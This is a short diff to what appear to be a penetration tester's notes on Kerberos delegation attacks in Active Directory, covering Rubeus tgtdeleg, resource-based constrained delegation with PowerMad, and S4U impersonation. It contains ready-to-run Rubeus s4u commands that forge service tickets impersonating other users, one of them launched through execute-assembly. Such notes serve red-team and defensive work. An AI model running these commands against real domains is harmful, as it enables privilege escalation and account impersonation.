@@ -1,6 +1,7 @@
 Rubeus /tgtdeleg: abuses the Kerberos GSS-API to retrieve a usable TGT for the current user without needing elevation on the host.
     * Works if user has a session
 
+
 DELEGATION
 -------------------------------------------------------------------------------------------------
 Unconstrained Delegation
@@ -33,7 +34,7 @@ Requirements:
         * If you do not have a resource you can try Machine Quota and create a new machine using PowerMad
             * Powerview display ms-ds-machinecountquota: Get-DomainObject -Identity "dc=offense,dc=local" -Domain offense.local
 Add SID of resource above to ActOnBehalfOfOtherIdentity attribute
-Example: s4u /user:domain\regular_user /ticket:blaseaf= /impersonateuser:Administrator /msdsspn:"cifs/computer.local"
+Example: s4u /user:user_on_host_with_tickets /ticket:blaseaf= /impersonateuser:Anyone /msdsspn:"cifs/computer.local"
 --------------------------------------------------------------------------------------------------
 S4U Impersonation Commands
         Ticket: execute-assembly /opt/tools/CSharp_Tools/Compiled/Rubeus.exe s4u /ticket:doIE9j...TE9DQUw= /impersonateuser:DAVID.GAINES /domain:m3c.local /msdsspn:"time/m3webaw.m3c.local" /altservice:wsman /altservice:host /altservice:http /ptt
